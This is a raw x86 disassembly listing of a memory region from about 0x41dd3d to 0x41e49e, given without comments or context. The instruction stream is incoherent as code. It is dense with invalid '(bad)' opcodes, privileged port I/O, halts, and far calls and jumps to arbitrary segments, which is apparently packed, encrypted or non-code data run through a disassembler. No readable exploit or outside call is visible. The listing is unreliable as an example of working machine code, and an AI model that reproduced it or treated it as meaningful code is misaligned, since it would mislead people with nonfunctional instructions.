  41dd3d:	jecxz  0x41dcd3
  41dd3f:	mov    edx,DWORD PTR [edi]
  41dd41:	push   edi
  41dd42:	dec    eax
  41dd43:	xchg   BYTE PTR [ecx],dh
  41dd45:	pop    ss
  41dd46:	das    
  41dd47:	pop    ebp
  41dd48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd49:	mov    ebx,0x6f1853e1
  41dd4e:	jb     0x41dd79
  41dd50:	pop    ebx
  41dd51:	addr16 out 0xef,al
  41dd54:	call   FWORD PTR [ecx-0x4]
  41dd57:	xchg   edi,eax
  41dd58:	fwait
  41dd59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd5a:	add    DWORD PTR [edx+eax*2],ecx
  41dd5d:	lock xor ebx,DWORD PTR [ebp+0x359be9e5]
  41dd64:	dec    esi
  41dd65:	sbb    al,0xe5
  41dd67:	and    DWORD PTR [esi+0x7b41e07c],esi
  41dd6d:	mov    al,ds:0xc0e78085
  41dd72:	jnp    0x41dd34
  41dd74:	data16 clc 
  41dd76:	and    al,0x99
  41dd78:	mov    esi,0x9b2e8d97
  41dd7d:	bound  esi,QWORD PTR [edx]
  41dd7f:	popa   
  41dd80:	pushf  
  41dd81:	and    al,0xd3
  41dd83:	pop    edx
  41dd84:	xor    al,0xc
  41dd86:	bnd jmp 0x41dd1d
  41dd89:	inc    ecx
  41dd8a:	add    BYTE PTR [ecx-0x7cb0377e],ch
  41dd90:	loop   0x41dd53
  41dd92:	repz pop ds
  41dd94:	add    ebx,DWORD PTR [esi]
  41dd96:	jg     0x41dde7
  41dd98:	cdq    
  41dd99:	in     al,0x7b
  41dd9b:	je     0x41dd59
  41dd9d:	xchg   esi,eax
  41dd9e:	or     al,ah
  41dda0:	(bad)  
  41dda2:	push   0x9256effc
  41dda7:	fstp   QWORD PTR [edi]
  41dda9:	hlt    
  41ddaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddab:	cld    
  41ddac:	xlat   BYTE PTR ds:[ebx]
  41ddad:	retf   
  41ddae:	xor    eax,0x402e92bd
  41ddb3:	sbb    BYTE PTR [edi+0x4ac8f18e],ah
  41ddb9:	adc    dl,BYTE PTR [eax+0x1ccafdb4]
  41ddbf:	add    DWORD PTR [ecx+0x381ff0b9],edx
  41ddc5:	out    dx,eax
  41ddc6:	ret    
  41ddc7:	out    dx,al
  41ddc8:	cdq    
  41ddc9:	xchg   BYTE PTR [esi+0x12],bh
  41ddcc:	cli    
  41ddcd:	push   ecx
  41ddce:	data16 loope 0x41de1b
  41ddd1:	(bad)
  41ddd4:	rep stos BYTE PTR es:[edi],al
  41ddd6:	div    DWORD PTR [edi]
  41ddd8:	or     eax,DWORD PTR [eax-0x392d688a]
  41ddde:	out    dx,eax
  41dddf:	loopne 0x41dda0
  41dde1:	cld    
  41dde2:	inc    edi
  41dde3:	in     al,dx
  41dde4:	mov    bh,0x3b
  41dde6:	and    al,0x93
  41dde8:	push   edi
  41dde9:	dec    ecx
  41ddea:	mov    esp,0x9e2fdb32
  41ddef:	shr    DWORD PTR [esp+ebx*4+0x52],1
  41ddf3:	sub    dl,BYTE PTR [ebp+0x68c6d5a9]
  41ddf9:	xor    al,0x1a
  41ddfb:	adc    al,0xa2
  41ddfd:	mov    bl,cl
  41ddff:	xchg   edi,eax
  41de00:	das    
  41de01:	push   ebx
  41de02:	stos   DWORD PTR es:[edi],eax
  41de03:	lea    esi,[ecx]
  41de05:	xor    edi,DWORD PTR ds:0x1cfbef83
  41de0b:	sbb    eax,0x3f3ad21d
  41de10:	addr16 jl 0x41de75
  41de13:	or     BYTE PTR [esi-0x59],0xcd
  41de17:	retf   
  41de18:	int    0x4d
  41de1a:	cmp    bl,BYTE PTR [ebp+0x31b1b536]
  41de20:	cs pop esi
  41de22:	mov    esi,0x3931428c
  41de27:	xor    eax,0x668a5285
  41de2c:	jecxz  0x41ddba
  41de2e:	repz (bad) 
  41de30:	sbb    ebp,edx
  41de32:	ficomp DWORD PTR [eax-0x7483f127]
  41de38:	dec    esi
  41de39:	mov    bh,0xc3
  41de3b:	repnz shl BYTE PTR [edx],cl
  41de3e:	push   edi
  41de3f:	scas   eax,DWORD PTR es:[edi]
  41de40:	pop    esi
  41de41:	mov    ds:0x7563563a,eax
  41de46:	cmc    
  41de47:	xor    dh,BYTE PTR [ecx-0x64]
  41de4a:	push   0x49b9bdf8
  41de4f:	call   0x2881:0x70b85c65
  41de56:	or     al,0x99
  41de58:	sahf   
  41de59:	cdq    
  41de5a:	bound  esp,QWORD PTR gs:[edx-0x7e]
  41de5e:	lods   eax,DWORD PTR ds:[esi]
  41de5f:	lods   eax,DWORD PTR ds:[esi]
  41de60:	sub    eax,0xa23f1ed6
  41de65:	shr    esi,cl
  41de67:	adc    BYTE PTR [ecx+eiz*1+0x349962a5],al
  41de6e:	lea    ebx,[ecx-0x47]
  41de71:	mov    eax,0x67dfa0c2
  41de76:	arpl   WORD PTR [ebx-0x7d],sp
  41de79:	in     eax,dx
  41de7a:	in     eax,dx
  41de7b:	sbb    eax,0x5e47740
  41de80:	mov    eax,0xecb75178
  41de85:	pop    edx
  41de86:	pop    ebx
  41de87:	pop    ebx
  41de88:	jecxz  0x41de53
  41de8a:	fisub  DWORD PTR [ebx-0x32]
  41de8d:	sbb    ah,BYTE PTR [edi-0x34]
  41de90:	int    0x2f
  41de92:	jo     0x41def5
  41de94:	imul   ecx,DWORD PTR [ecx-0x51961637],0xf6c1b8df
  41de9e:	test   BYTE PTR [ebx+0x1e],0x3d
  41dea2:	jp     0x41dee8
  41dea4:	mov    bl,0xd1
  41dea6:	pusha  
  41dea7:	gs in  eax,0x22
  41deaa:	jae    0x41df1f
  41deac:	mov    bl,0xc
  41deae:	jecxz  0x41de48
  41deb0:	jb     0x41de57
  41deb2:	inc    edx
  41deb3:	mov    bh,0xdb
  41deb5:	jecxz  0x41dea3
  41deb7:	in     al,dx
  41deb8:	mov    WORD PTR [edx-0x4f],fs
  41debb:	enter  0xf2e2,0x32
  41debf:	inc    edi
  41dec0:	inc    edi
  41dec1:	xchg   DWORD PTR [edx+edi*4],edi
  41dec4:	jg     0x41de65
  41dec6:	in     eax,dx
  41dec7:	sbb    eax,0xbcbc1a9d
  41decc:	mov    esp,0x54b94002
  41ded1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ded2:	shr    esi,cl
  41ded4:	shr    BYTE PTR [ebp+ebx*4-0x4d],1
  41ded8:	mov    eax,0xd2e2c8b0
  41dedd:	adc    cl,BYTE PTR [edi]
  41dedf:	out    dx,al
  41dee0:	(bad)  
  41dee2:	lock call 0x31562178
  41dee8:	cmp    esi,DWORD PTR [edi]
  41deea:	retf   
  41deeb:	out    0xe6,al
  41deed:	jae    0x41df4c
  41deef:	adc    BYTE PTR [ebp+0x1b],0x63
  41def3:	imul   edi,ecx,0xda18ed02
  41def9:	ret    
  41defa:	test   BYTE PTR [eax-0x1],dh
  41defd:	pop    ebp
  41defe:	scas   al,BYTE PTR es:[edi]
  41deff:	scas   al,BYTE PTR es:[edi]
  41df00:	std    
  41df01:	cmp    al,0x93
  41df03:	(bad)  
  41df05:	inc    ebp
  41df06:	rcl    BYTE PTR [ebx+0x68601406],cl
  41df0c:	mov    ah,0x7d
  41df0e:	xchg   edx,eax
  41df0f:	jmp    0x298e:0xbd29b7f5
  41df16:	cwde   
  41df17:	fs cmp esp,eax
  41df1a:	xchg   edi,eax
  41df1b:	ficom  WORD PTR [ecx-0x732caf6b]
  41df21:	js     0x41df22
  41df23:	vmovntdq XMMWORD PTR [ebx],xmm7
  41df27:	mov    ah,0x21
  41df29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df2a:	xor    dl,0xf2
  41df2d:	jb     0x41df90
  41df2f:	jmp    0x7119e33a
  41df34:	mov    al,ds:0xd2959484
  41df39:	ret    0x1fa3
  41df3c:	dec    esp
  41df3d:	and    al,0x7f
  41df3f:	cld    
  41df40:	pop    edi
  41df41:	stc    
  41df42:	mov    DWORD PTR [edi-0x35004007],edi
  41df48:	ja     0x41df88
  41df4a:	add    dh,ch
  41df4c:	stc    
  41df4d:	cmp    ebx,DWORD PTR [bp+0x3b]
  41df51:	add    al,0xf0
  41df53:	loopne 0x41df04
  41df55:	cld    
  41df56:	icebp  
  41df57:	xor    BYTE PTR [edx-0x2],bh
  41df5a:	aad    0xcf
  41df5c:	or     esp,ebx
  41df5e:	pop    ecx
  41df5f:	push   es
  41df60:	push   ss
  41df61:	addr16 pusha 
  41df63:	xchg   edx,eax
  41df64:	or     ebp,DWORD PTR [ecx-0x5c]
  41df67:	sbb    al,0xd3
  41df69:	sbb    al,0x2
  41df6b:	int    0x82
  41df6d:	inc    eax
  41df6e:	jnp    0x41df69
  41df70:	xor    edx,DWORD PTR [ebx-0x14]
  41df73:	xchg   ecx,eax
  41df74:	stos   BYTE PTR es:[edi],al
  41df75:	fadd   QWORD PTR [ecx-0x18]
  41df78:	pop    es
  41df79:	jo     0x41df4d
  41df7b:	(bad)  
  41df7c:	push   esi
  41df7d:	adc    ebp,DWORD PTR [edx]
  41df7f:	gs pushf 
  41df81:	jg     0x41df69
  41df83:	cmp    bh,BYTE PTR [ebx-0x1ac23138]
  41df89:	shr    DWORD PTR [edx],1
  41df8b:	add    ebp,DWORD PTR [edi]
  41df8d:	rol    BYTE PTR [esi+edx*2+0x3a],cl
  41df91:	fsubr  st(2),st
  41df93:	(bad)  
  41df94:	jecxz  0x41df95
  41df96:	xchg   ebp,eax
  41df97:	into   
  41df98:	fisubr WORD PTR [edi-0x201d8370]
  41df9e:	pusha  
  41df9f:	jbe    0x41df9f
  41dfa1:	push   cs
  41dfa2:	xchg   DWORD PTR [ebp-0x3d5e9edf],ecx
  41dfa8:	sar    BYTE PTR [esi+ebx*8+0x2c58b6f9],cl
  41dfaf:	jo     0x41e021
  41dfb1:	mov    al,0x8f
  41dfb3:	push   edx
  41dfb4:	jp     0x41dfed
  41dfb6:	pusha  
  41dfb7:	jmp    0xb7acb747
  41dfbc:	call   0x589e9b37
  41dfc1:	pop    ecx
  41dfc2:	popa   
  41dfc3:	jle    0x41e026
  41dfc5:	xchg   ecx,eax
  41dfc6:	xchg   ebx,eax
  41dfc7:	xchg   ebx,eax
  41dfc8:	and    ecx,eax
  41dfca:	adc    al,0x51
  41dfcc:	adc    al,0xb2
  41dfce:	mov    al,0xbc
  41dfd0:	inc    esp
  41dfd1:	mov    ebp,0xd3a74636
  41dfd6:	out    0xd1,al
  41dfd8:	ret    
  41dfd9:	pop    es
  41dfda:	fisubr DWORD PTR [edi]
  41dfdc:	jo     0x41dfbc
  41dfde:	(bad)  
  41dfdf:	in     eax,0xe2
  41dfe1:	and    eax,0x4cbe5d2e
  41dfe6:	xchg   edx,eax
  41dfe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfe8:	add    al,0x61
  41dfea:	(bad)
  41dfee:	mov    DWORD PTR [edi-0x39],0xd215cb94
  41dff5:	sub    al,0x65
  41dff7:	cmp    BYTE PTR [eax+esi*1],bl
  41dffa:	sbb    BYTE PTR [esi],cl
  41dffc:	imul   esi,DWORD PTR [ebp-0x27e245a6],0xe79e0aca
  41e006:	xor    DWORD PTR [esi-0x55],edx
  41e009:	icebp  
  41e00a:	repnz lds ecx,FWORD PTR [ebx+0x4e]
  41e00e:	mov    cs,WORD PTR [edi+0x5cdbb769]
  41e014:	mov    edx,0x9bb9997c
  41e019:	mov    bl,0x4c
  41e01b:	dec    ebp
  41e01c:	dec    ebp
  41e01d:	xor    BYTE PTR [edi],bh
  41e01f:	aas    
  41e020:	iret   
  41e021:	not    dh
  41e023:	push   cs
  41e024:	das    
  41e025:	pop    esi
  41e026:	mov    esp,0x32edd3a0
  41e02b:	xor    eax,0x1f5bc935
  41e030:	sti    
  41e031:	sbb    BYTE PTR [ebp-0x7b6095e],ah
  41e037:	jle    0x41dff9
  41e039:	fnstsw WORD PTR [ebx+0x5ab56977]
  41e03f:	add    al,0x51
  41e041:	inc    esp
  41e042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e043:	pop    esp
  41e044:	bound  ebx,QWORD PTR [eax]
  41e046:	cmovns ecx,edi
  41e049:	push   ebx
  41e04a:	cmp    ch,ch
  41e04c:	ss mov esi,0x972e521f
  41e052:	sub    DWORD PTR [edi-0x29117fd5],edx
  41e058:	mov    bl,0xb1
  41e05a:	mov    esi,0xe152b941
  41e05f:	(bad)  
  41e060:	lea    ebx,[ebx]
  41e062:	jl     0x41e046
  41e064:	xchg   ebx,eax
  41e065:	lahf   
  41e066:	mov    ds:0xb0b2ebdf,al
  41e06b:	xor    bh,cl
  41e06d:	mov    ebx,0xf39b7cef
  41e072:	push   esi
  41e073:	mov    ebp,DWORD PTR [edx+0x4d]
  41e076:	imul   edx
  41e078:	fcmovnu st,st(1)
  41e07a:	(bad)  
  41e07c:	(bad)  
  41e07d:	mov    ebp,0x4f8f8cbb
  41e082:	jo     0x41e079
  41e084:	fidiv  DWORD PTR [ebp+0x3e]
  41e087:	cli    
  41e088:	shl    DWORD PTR [edi+0x4dd294f0],1
  41e08e:	inc    ebx
  41e08f:	adc    DWORD PTR [eax-0x5a374eae],0xffffffd5
  41e096:	dec    ebx
  41e097:	sbb    al,0x1e
  41e099:	sbb    al,0xf0
  41e09b:	ins    BYTE PTR es:[edi],dx
  41e09c:	arpl   WORD PTR [ebx-0x3f3acdc],ax
  41e0a2:	xor    bl,bl
  41e0a4:	inc    edi
  41e0a5:	daa    
  41e0a6:	in     al,dx
  41e0a7:	jl     0x41e08c
  41e0a9:	out    dx,eax
  41e0aa:	jb     0x41e11d
  41e0ac:	neg    DWORD PTR [edi]
  41e0ae:	xor    esi,DWORD PTR [edi+0x4fd50f7b]
  41e0b4:	jmp    0xd3933ebb
  41e0b9:	and    bh,0xd2
  41e0bc:	add    cl,BYTE PTR [esi+0x71]
  41e0bf:	pop    eax
  41e0c0:	xchg   esi,eax
  41e0c1:	jg     0x41e0e9
  41e0c3:	cdq    
  41e0c4:	jle    0x41e0c8
  41e0c6:	jecxz  0x41e143
  41e0c8:	add    ebx,DWORD PTR [eax+0x65b43b2a]
  41e0ce:	sbb    al,BYTE PTR [esi+0x4bfb6e42]
  41e0d4:	xchg   DWORD PTR [eax],esp
  41e0d6:	dec    esp
  41e0d7:	mov    eax,ds:0x9025490
  41e0dc:	and    dl,BYTE PTR [ebp-0x46d6dd1a]
  41e0e2:	inc    ebx
  41e0e3:	(bad)  
  41e0e5:	add    DWORD PTR [eax],0xcf8d9daa
  41e0eb:	xor    al,0xcf
  41e0ed:	pop    ss
  41e0ee:	xchg   esi,eax
  41e0ef:	adc    bh,0xae
  41e0f2:	inc    edi
  41e0f3:	shr    BYTE PTR [ebx+0x27],0x0
  41e0f7:	and    BYTE PTR [eax],0xba
  41e0fa:	adc    esi,ebp
  41e0fc:	neg    edi
  41e0fe:	push   edx
  41e0ff:	xor    eax,0x78efbbc7
  41e104:	clc    
  41e105:	lds    edi,FWORD PTR [ebx+0x7bedca8f]
  41e10b:	push   edi
  41e10c:	fisttp DWORD PTR [ebx+0x5ab01053]
  41e112:	aas    
  41e113:	lock xor eax,0x7b8682d3
  41e119:	pop    es
  41e11a:	sub    eax,0x4a7be76d
  41e11f:	jnp    0x41e0a9
  41e121:	sar    DWORD PTR [eax-0x1],0x43
  41e125:	arpl   WORD PTR [esi],dx
  41e127:	mov    BYTE PTR [esi-0x6cdc7dd0],al
  41e12d:	sbb    al,0x1
  41e12f:	mov    al,0x9d
  41e131:	xchg   BYTE PTR [edx],dh
  41e133:	dec    edi
  41e134:	(bad)  
  41e135:	xchg   edx,eax
  41e136:	dec    ebx
  41e137:	pop    ebx
  41e138:	iret   
  41e139:	mov    BYTE PTR [esi],cl
  41e13b:	dec    DWORD PTR [ebx+edx*4]
  41e13e:	mov    ebp,DWORD PTR [ebx]
  41e140:	pushf  
  41e141:	pop    esi
  41e142:	(bad)  
  41e143:	push   ecx
  41e144:	loop   0x41e1a7
  41e146:	(bad)  
  41e147:	std    
  41e148:	(bad)  
  41e149:	sbb    BYTE PTR [esi-0x57],bh
  41e14c:	into   
  41e14d:	cld    
  41e14e:	ret    0xfb0c
  41e151:	mov    ebx,0xffbfdc5b
  41e156:	push   ds
  41e157:	adc    esp,ebx
  41e159:	xchg   ebx,eax
  41e15a:	pop    esp
  41e15b:	mov    eax,0x36b54cb0
  41e160:	inc    esi
  41e161:	(bad)  [edi+ecx*8-0x63]
  41e165:	sahf   
  41e166:	sahf   
  41e167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e168:	pop    eax
  41e169:	sub    al,0xb3
  41e16b:	xor    bl,BYTE PTR [eax+0x21]
  41e16e:	sub    al,BYTE PTR [esp+edi*1+0x7d]
  41e172:	mov    dl,0xce
  41e174:	rcl    ecx,1
  41e176:	ds xchg edi,eax
  41e178:	push   edi
  41e179:	scas   eax,DWORD PTR es:[edi]
  41e17a:	push   ecx
  41e17b:	sub    dl,BYTE PTR [eax+esi*8]
  41e17e:	jl     0x41e11f
  41e180:	outs   dx,BYTE PTR ds:[esi]
  41e181:	scas   eax,DWORD PTR es:[edi]
  41e182:	(bad)  
  41e183:	pusha  
  41e184:	xor    BYTE PTR [eax+0x72],ah
  41e187:	jb     0x41e19b
  41e189:	dec    edi
  41e18a:	sub    DWORD PTR [edx+0x52a512c5],ecx
  41e190:	xchg   ecx,eax
  41e191:	(bad)  
  41e193:	int    0xff
  41e195:	xchg   ebp,edi
  41e197:	std    
  41e198:	add    ecx,DWORD PTR [esi]
  41e19a:	(bad)  
  41e19b:	vmread ebx,esi
  41e19e:	int    0x37
  41e1a0:	mov    ecx,0xbb0efb7d
  41e1a5:	cmp    edi,DWORD PTR [ebx-0x3745a354]
  41e1ab:	out    0xf3,al
  41e1ad:	dec    ebp
  41e1ae:	pop    esi
  41e1af:	outs   dx,BYTE PTR ds:[esi]
  41e1b0:	mov    ebp,0x591518a0
  41e1b5:	pop    esp
  41e1b6:	pop    esi
  41e1b7:	mov    ds:0xad53af5e,al
  41e1bc:	lea    esi,[ecx]
  41e1be:	xor    DWORD PTR [ecx],esi
  41e1c0:	dec    esi
  41e1c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1c2:	frstor [esi-0x424e9123]
  41e1c8:	mov    ebp,0x4c8093ad
  41e1cd:	push   cs
  41e1ce:	inc    edx
  41e1cf:	adc    al,0x15
  41e1d1:	or     BYTE PTR [ebx-0x6106c4b0],al
  41e1d7:	aas    
  41e1d8:	mov    ds:0x99991510,eax
  41e1dd:	popf   
  41e1de:	gs jno 0x41e24a
  41e1e1:	xchg   ecx,eax
  41e1e2:	sub    al,0x4b
  41e1e4:	pop    ecx
  41e1e5:	mov    ecx,0x53138978
  41e1ea:	or     al,0x74
  41e1ec:	mov    al,0xbf
  41e1ee:	(bad)  
  41e1ef:	jmp    0x45bc:0xdc6e15ea
  41e1f6:	test   eax,0x428c2458
  41e1fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1fd:	addr16 clc 
  41e1ff:	lea    ebx,[edi-0x1]
  41e202:	jne    0x41e1d2
  41e204:	sbb    cl,BYTE PTR ds:0x54a52492
  41e20a:	sub    dh,BYTE PTR [ecx]
  41e20c:	sbb    BYTE PTR [eax+edi*1],cl
  41e20f:	cmp    edi,DWORD PTR [ebx]
  41e211:	shl    edi,0x3d
  41e214:	push   0x63
  41e216:	jne    0x41e246
  41e218:	pop    esi
  41e219:	pop    esi
  41e21a:	outs   dx,BYTE PTR gs:[esi]
  41e21c:	jbe    0x41e1ac
  41e21e:	jmp    0xff003bbc
  41e223:	pop    ebx
  41e224:	pop    edi
  41e225:	jecxz  0x41e21f
  41e227:	in     al,0x94
  41e229:	or     al,0x28
  41e22b:	adc    al,0xa
  41e22d:	pushf  
  41e22e:	sahf   
  41e22f:	pushf  
  41e230:	jo     0x41e2a6
  41e232:	je     0x41e1fc
  41e234:	inc    esp
  41e235:	mov    ebp,0x37db9dce
  41e23a:	push   0xb0b22f9d
  41e23f:	mov    ah,0xc2
  41e241:	rep lods eax,DWORD PTR ds:[esi]
  41e243:	cmp    eax,0xc58c6892
  41e248:	icebp  
  41e249:	nop
  41e24a:	mov    cl,0x67
  41e24c:	mov    edi,0x22feef0c
  41e251:	lahf   
  41e252:	cmp    al,0xdc
  41e254:	ror    BYTE PTR [edi+0x4c0c0fa1],0x5b
  41e25b:	outs   dx,DWORD PTR ds:[esi]
  41e25c:	push   edx
  41e25d:	in     eax,dx
  41e25e:	repz xchg ecx,eax
  41e260:	cs push eax
  41e262:	mov    esi,0x6c44c759
  41e267:	jb     0x41e20e
  41e269:	xlat   BYTE PTR ds:[ebx]
  41e26a:	sub    al,0xf2
  41e26c:	mov    al,ds:0x88e41b1f
  41e271:	data16 in al,dx
  41e273:	jbe    0x41e2e1
  41e275:	ins    BYTE PTR es:[edi],dx
  41e276:	test   BYTE PTR [ebx*2+0x5ae5925b],0x5f
  41e27e:	adc    al,0x44
  41e280:	pushf  
  41e281:	imul   esp,ebp,0x53a4dd21
  41e287:	mov    WORD PTR [ecx],ds
  41e289:	jmp    0x2624:0x2967e7e9
  41e290:	pop    esp
  41e291:	sbb    BYTE PTR [ebx],bl
  41e293:	call   0x3648:0xa048d0cb
  41e29a:	push   ss
  41e29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e29c:	test   edi,ecx
  41e29e:	add    edi,DWORD PTR [edi-0x3]
  41e2a1:	std    
  41e2a2:	out    0x9f,al
  41e2a4:	jg     0x41e27c
  41e2a6:	jecxz  0x41e25d
  41e2a8:	adc    eax,DWORD PTR [eax]
  41e2aa:	test   DWORD PTR [eax-0x61e67ad1],ebx
  41e2b0:	les    ebx,FWORD PTR [edx-0x4b]
  41e2b3:	mul    DWORD PTR [esi]
  41e2b5:	addr16 inc esi
  41e2b7:	enter  0x9be1,0x54
  41e2bb:	stc    
  41e2bc:	dec    ecx
  41e2bd:	mov    WORD PTR [edi+0x1c],ds
  41e2c0:	xor    al,0x1e
  41e2c2:	stc    
  41e2c3:	ret    0x5e83
  41e2c6:	cld    
  41e2c7:	and    al,0xd5
  41e2c9:	sbb    bh,dh
  41e2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2cc:	add    eax,0x23943ebd
  41e2d1:	jge    0x41e266
  41e2d3:	add    al,0x43
  41e2d5:	inc    eax
  41e2d6:	push   es
  41e2d7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2d9:	pop    ecx
  41e2da:	sahf   
  41e2db:	loope  0x41e282
  41e2dd:	xchg   esp,eax
  41e2de:	and    DWORD PTR [edx],edx
  41e2e0:	dec    ecx
  41e2e1:	hlt    
  41e2e2:	jo     0x41e34e
  41e2e4:	ret    0x54d3
  41e2e7:	fstp   TBYTE PTR [ebp+0x41]
  41e2ea:	add    BYTE PTR [ebx+0x17ad8204],al
  41e2f0:	int3   
  41e2f1:	in     al,dx
  41e2f2:	cld    
  41e2f3:	outs   dx,DWORD PTR ds:[esi]
  41e2f4:	test   al,0x87
  41e2f6:	jg     0x41e27f
  41e2f8:	ret    
  41e2f9:	jmp    0xf97a538d
  41e2fe:	imul   edi,esp,0xb231fd8f
  41e304:	push   0xc138bf02
  41e309:	shl    ecx,0x31
  41e30c:	stos   DWORD PTR es:[edi],eax
  41e30d:	push   edi
  41e30e:	push   esi
  41e30f:	mov    ecx,0x8116eb75
  41e314:	out    dx,eax
  41e315:	push   ecx
  41e316:	pop    ds
  41e317:	pop    ds
  41e318:	out    0xe4,eax
  41e31a:	inc    esp
  41e31b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e31c:	loopne 0x41e2b4
  41e31e:	dec    edx
  41e31f:	adc    eax,0x8f2ab56a
  41e324:	pop    ds
  41e325:	cmp    eax,0x84f8e4e4
  41e32a:	loope  0x41e31c
  41e32c:	and    DWORD PTR [edi],ebx
  41e32e:	sti    
  41e32f:	fadd   st,st(7)
  41e331:	mov    ecx,0x6326f375
  41e336:	cmc    
  41e337:	xor    edx,ebp
  41e339:	cmc    
  41e33a:	jno    0x41e3b2
  41e33c:	mov    dh,0xb7
  41e33e:	cmp    DWORD PTR [eax+edi*1],edi
  41e341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e342:	ss push esi
  41e344:	arpl   WORD PTR [esi+0x76],bp
  41e347:	push   ss
  41e348:	iret   
  41e349:	repz dec ecx
  41e34b:	loop   0x41e36e
  41e34d:	in     eax,dx
  41e34e:	push   esi
  41e34f:	mov    ebp,DWORD PTR [eax+0x3636a050]
  41e355:	inc    esi
  41e356:	jge    0x41e304
  41e358:	into   
  41e359:	hlt    
  41e35a:	int3   
  41e35b:	or     al,0x8f
  41e35d:	push   ds
  41e35e:	cmp    eax,0x73f9f364
  41e363:	cmp    al,0xcf
  41e365:	xlat   BYTE PTR ds:[ebx]
  41e366:	jbe    0x41e35e
  41e368:	cmc    
  41e369:	imul   edx,DWORD PTR [ebx+ebp*4+0x3870e2ba],0x18
  41e371:	lock aad 0xaf
  41e374:	jl     0x41e30b
  41e376:	rcl    ebx,cl
  41e378:	push   ebx
  41e379:	jp     0x41e338
  41e37b:	push   ds
  41e37c:	lahf   
  41e37d:	(bad)  
  41e37e:	hlt    
  41e37f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e380:	hlt    
  41e381:	push   cs
  41e382:	lds    edi,FWORD PTR [ebp+0x3333331e]
  41e388:	cmp    al,0x7c
  41e38a:	clc    
  41e38b:	xor    ch,0xa7
  41e38e:	sbb    edi,DWORD PTR [edx+0x5b]
  41e391:	repnz mov ecx,0xbf5c6e39
  41e397:	into   
  41e398:	in     al,0xe4
  41e39a:	adc    al,0x33
  41e39c:	rcl    DWORD PTR [ebx+0x1c],cl
  41e39f:	sbb    eax,0xa078721d
  41e3a4:	adc    ecx,DWORD PTR [eax+0x41018306]
  41e3aa:	sbb    BYTE PTR [eax],dl
  41e3ac:	daa    
  41e3ad:	xor    ebp,edi
  41e3af:	push   esi
  41e3b0:	(bad)  
  41e3b2:	lock cdq 
  41e3b4:	pushf  
  41e3b5:	call   0xeae5:0x736ddba4
  41e3bc:	jne    0x41e3d8
  41e3be:	lea    eax,[esi]
  41e3c0:	(bad)  
  41e3c1:	pop    ds
  41e3c2:	cmp    eax,0x80f0e8e2
  41e3c7:	jmp    0x41e400
  41e3c9:	outs   dx,DWORD PTR ds:[esi]
  41e3ca:	jb     0x41e3b3
  41e3cc:	into   
  41e3cd:	sbb    edx,esp
  41e3cf:	jmp    0x41e434
  41e3d1:	test   BYTE PTR [ecx+0x48],al
  41e3d4:	pushf  
  41e3d5:	and    al,0x84
  41e3d7:	push   ecx
  41e3d8:	dec    eax
  41e3d9:	lods   eax,DWORD PTR ds:[esi]
  41e3da:	push   edx
  41e3db:	loope  0x41e3cf
  41e3dd:	in     eax,0x55
  41e3df:	jbe    0x41e397
  41e3e1:	mov    bh,0x78
  41e3e3:	cld    
  41e3e4:	clc    
  41e3e5:	xor    DWORD PTR [ebp+0x4f898366],ebp
  41e3eb:	jle    0x41e377
  41e3ed:	repnz fmul DWORD PTR [ebx+edi*4]
  41e3f1:	addr16 jge 0x41e3fa
  41e3f4:	pop    ebx
  41e3f5:	fist   DWORD PTR [edi+ecx*2]
  41e3f8:	out    dx,al
  41e3f9:	repz mov ecx,0xec603ffe
  41e3ff:	fwait
  41e400:	mov    edi,0xa0747f85
  41e405:	aaa    
  41e406:	inc    ecx
  41e407:	or     DWORD PTR [ebx+esi*4],ecx
  41e40a:	lds    esp,FWORD PTR [esi-0x27e70c5]
  41e410:	mov    eax,ds:0x9c1b99af
  41e415:	adc    DWORD PTR ds:[ecx+0x5e],ebx
  41e419:	into   
  41e41a:	fwait
  41e41b:	and    eax,0x6f8be339
  41e420:	shl    bh,0x21
  41e423:	xor    eax,DWORD PTR ds:0xc412f561
  41e429:	add    eax,DWORD PTR [esi+0x7c]
  41e42c:	add    eax,0x34123c22
  41e431:	mov    bl,0x8
  41e433:	xor    cl,BYTE PTR [esp+ecx*4]
  41e436:	out    0x3f,eax
  41e438:	xor    eax,0x3aa4042
  41e43d:	cmp    eax,0x4cd24e87
  41e442:	pop    edi
  41e443:	jecxz  0x41e470
  41e445:	sub    BYTE PTR [edi-0x403b418a],dh
  41e44b:	adc    BYTE PTR [eax],al
  41e44d:	(bad)  
  41e44e:	ffreep st(7)
  41e450:	sar    DWORD PTR [edi-0x86bd80d],cl
  41e456:	loopne 0x41e42f
  41e458:	mov    esi,0xdb3317e0
  41e45d:	mov    cl,BYTE PTR [ecx]
  41e45f:	jb     0x41e419
  41e461:	sahf   
  41e462:	sbb    DWORD PTR [ebp-0x7f],0xa55dc4d4
  41e469:	adc    BYTE PTR [ebx-0x70],al
  41e46c:	sub    DWORD PTR [esp+edi*4],0x8d4bc0f2
  41e473:	nop
  41e474:	dec    eax
  41e475:	and    DWORD PTR [ecx+eiz*8],esi
  41e478:	les    ebx,FWORD PTR [ebp+0x7e004333]
  41e47e:	fmulp  st(0),st
  41e480:	inc    ecx
  41e481:	mov    edx,0x138104c3
  41e486:	(bad)  
  41e487:	and    DWORD PTR [edi-0x431c88ed],ebp
  41e48d:	inc    edx
  41e48e:	xor    al,0x2
  41e490:	sub    DWORD PTR [ebx-0x5c55abfc],edx
  41e496:	add    eax,0xecea0503
  41e49b:	pushf  
  41e49c:	cdq    
  41e49d:	xchg   ebx,eax
  41e49e:	scas   eax,DWORD PTR es:[edi]
